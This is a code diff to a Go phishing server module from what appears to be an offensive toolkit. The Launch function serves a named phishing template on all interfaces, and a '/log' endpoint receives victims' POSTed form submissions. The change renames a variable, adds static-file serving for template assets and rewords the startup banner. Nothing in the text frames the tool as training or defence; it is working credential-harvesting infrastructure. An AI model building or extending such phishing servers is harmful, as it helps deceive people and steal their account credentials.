@@ -11,14 +11,19 @@ import (
 )
 
 func Launch(templateName string, port int) {
-	basePath := filepath.Join("modules", "phishing", "templates", templateName)
-	indexFile := filepath.Join(basePath, "index.html")
+	templatePath := filepath.Join("modules", "phishing", "templates", templateName)
+	indexFile := filepath.Join(templatePath, "index.html")
 
 	if _, err := os.Stat(indexFile); os.IsNotExist(err) {
 		fmt.Printf("[!] Template '%s' does not exist.\n", templateName)
 		return
 	}
 
+	// Serve static files (CSS, images, etc.)
+	fs := http.FileServer(http.Dir(templatePath))
+	http.Handle("/"+templateName+"/", http.StripPrefix("/"+templateName+"/", fs))
+
+	// Main page
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		tmpl, err := template.ParseFiles(indexFile)
 		if err != nil {
@@ -28,6 +33,7 @@ func Launch(templateName string, port int) {
 		tmpl.Execute(w, nil)
 	})
 
+	// Log handler
 	http.HandleFunc("/log", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method == http.MethodPost {
 			r.ParseForm()
@@ -47,6 +53,6 @@ func Launch(templateName string, port int) {
 		http.Redirect(w, r, "/", http.StatusSeeOther)
 	})
 
-	fmt.Printf("[+] Phishing server '%s' running at http://0.0.0.0:%d\n", templateName, port)
+	fmt.Printf("[+] Serving phishing page '%s' at http://0.0.0.0:%d\n", templateName, port)
 	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
 }
